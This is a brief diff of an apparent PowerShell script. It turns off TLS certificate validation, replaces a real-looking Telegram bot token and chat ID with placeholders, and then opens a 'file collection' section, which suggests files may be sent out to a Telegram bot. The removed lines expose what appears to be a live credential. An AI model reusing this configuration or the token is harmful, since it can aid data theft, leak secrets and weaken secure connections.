@@ -18,8 +18,8 @@ add-type @"
 [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
 
 # Telegram Bot Configuration
-$TELEGRAM_BOT_TOKEN = '8357079658:AAHH8yeCG7eETLPdEqYvhFwlEtaeD36O2Dc'
-$TELEGRAM_CHAT_ID = '5302173301'
+$TELEGRAM_BOT_TOKEN = 'cccc'
+$TELEGRAM_CHAT_ID = 'xxx'
 
 # ============================================
 # FILE COLLECTION SECTION
